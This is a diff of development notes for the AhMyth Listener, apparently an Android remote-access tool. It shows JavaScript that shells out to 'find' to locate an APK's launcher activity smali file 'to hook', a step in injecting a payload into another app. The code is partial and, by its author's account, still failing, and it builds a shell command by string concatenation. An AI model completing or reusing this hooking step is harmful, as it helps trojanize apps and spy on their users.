@@ -165,22 +165,29 @@ Stop function for the AhMyth Listener | index.html = Line 69 |
 ```
 
 code utilising `unix "find"` command to find the correct launcher activity
+this is currently half working with apks whose launcher activity is in a smali_classes directory
+only problem is an error is still thrown when it shouldn't be indicating that i am doing something wrong some where
 ```javascript
-                exec('find -name "' + launcherPath.substring(launcherPath.lastIndexOf('/') + 1) + '"', { cwd: apkFolder }, (error, stdout, stderr) => {
-                    if (error) {
-                      // do something
-                        return;
-                      }
-                      
-
-                    var smaliPath = stdout.substring(stdout.indexOf('./') + 2);
-                    $appCtrl.Log("smali File to hook: " + smaliPath); // this returns full path of smali file from apkfolder, need to implement it for launcherPath var
+                // this returns full path of smali file starting from the users home directory
+                $appCtrl.Log("Locating Launcher Activity...")
+                exec('find -name "' + launcherPath + '"', { cwd: apkFolder }, (error, stdout, stderr) => {
+                  var launcherActivity = path.join(apkFolder, stdout.substring(stdout.indexOf("./") + 2));
+                  if (error !== null) {
+                      $appCtrl.Log("Locating Launcher Activity Failed!", CONSTANTS.logStatus.FAIL);
+                      return;
+                    }
+                    
+                    // but it fails to read the file afterwards
+                    $appCtrl.Log("Smali File to hook: " + launcherActivity); // print filepath in the log to confirm the file was found
                     $appCtrl.Log();
-                    fs.readFile(smaliPath, 'utf8', (error, data) => {
+                    fs.readFile(launcherActivity, 'utf8', (error, data) => {
                         if (error) {
                             $appCtrl.Log('Reading Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
                             $appCtrl.Log();
                             return;
                         }
-                    }); // throw this at the bottom
+
+                    });
+
+                });
 ``` 
